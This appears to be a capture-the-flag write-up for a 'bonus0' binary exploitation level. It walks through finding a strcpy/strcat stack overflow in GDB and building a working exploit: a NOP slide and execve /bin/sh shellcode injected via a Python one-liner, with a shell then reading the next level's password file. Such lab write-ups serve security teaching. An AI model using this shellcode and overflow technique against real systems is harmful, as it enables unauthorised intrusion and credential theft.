# Bonus 0

## Initial Context

- One file: `bonus0`

## Solving the Challenge

The program will prompt for 2 inputs and output them both but after limiting them to 20 characters each.

Looking at the code, we can see `strcpy` and `strcat` which might suggest that a buffer overflow exploit is possible.

And indeed by using a [pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), we can find that EIP is located at offset `9`.

```bash
$ gdb ./bonus0
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```

> As long that the first input is full (20 characters long) we still find the same EIP offset.
> 
> ```bash
> (gdb) run
> Starting program: /home/user/bonus0/bonus0
>  -
> AAAAAAAAAAAAAAAAAAAA
>  -
> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
> AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
> 
> Program received signal SIGSEGV, Segmentation fault.
> 0x41336141 in ?? ()
> ```

Why that? Since the two buffer of `pp` are following each others.
Since `first` is not null terminated, we continue on `second`.

1. `strcpy` will copy `20 (first's length)` + `20 (second's length)` + `4 (garbage)` to the `buffer`.
2. A space is added, at the end of the buffer, making it of length `25`.
3. `strcat` will then add another `20 (second's length)` + `4 (garbage)` to the `buffer`, overflowing it.

> This can be verified using GDB:
> 
> ```bash
> (gdb) break *pp+122 # at `call   0x8048390 <strcat@plt>`
> (gdb) run
> Starting program: /home/user/bonus0/bonus0
>  -
> AAAAAAAAAAAAAAAAAAAA
>  -
> BBBBBBBBBBBBBBBBBBBB
> 
> Breakpoint 1, 0x08048598 in > pp ()
> ```
> 
> We can verify that the `second`'s length is `24`.
> 
> ```bash
> (gdb) x *(void**)($esp+4)
> 0xbffff62c:      'B' <repeats 20 times>"\364, ", <incomplete sequence \375\26
> (gdb) call strlen(*(void**)($esp+4))
> $1 = 24
> ```
> 
> And that the `buffer`'s length before concat is 45.
> 
> ```bash
> (gdb) x *(void**)$esp
> 0xbffff666:      'A' <repeats 20 times>, 'B' <repeats 20 times>"\364, \017\375\267 "
> (gdb) call strlen(*(void**)$esp)
> $2 = 45
> ```

Since we can have a continuous payload of `29 bytes`, we can store a `shell code` directly into the buffer.

First we need to find the `buffer`'s address via `ltrace` and by looking at the `strcpy`'s return address.

```bash
$ ltrace ./bonus0
...
strcpy(0xbffff736, "A")       = 0xbffff736
...
```

We can craft the payload as follow:

```python
# NOP slide
"\x90" * 5

# first 15 bytes of the shell code
+ "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"

# padding of 4096 - payload - new line
+ "A" * (4096 - 20 - 1) + "\n"

# last 9 bytes of the shell code
+ "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

# `buffer`'s address: 0xbffff736 (or `36 f7 ff bf` in LE)
+ "\x36\xf7\xff\xbf"

# padding of 7 to 20
+ "A" * 7
```

And send it to the vulnerable program:

```bash
$ python -c 'print "\x90" * 5 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3" + "A" * (4096 - 20 - 1) + "\n" + "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x36\xf7\xff\xbf" + "A" * 7' > /tmp/bonus0
$ cat /tmp/bonus0 - | ./bonus0
 -
 -
�����1�Ph//shh/bin��PS�ᙰ
                        ̀6���AAAAAAA��� PS�ᙰ
                                            ̀6���AAAAAAA���
whoami
bonus1
cat /home/user/bonus1/.pass
<flag>
```
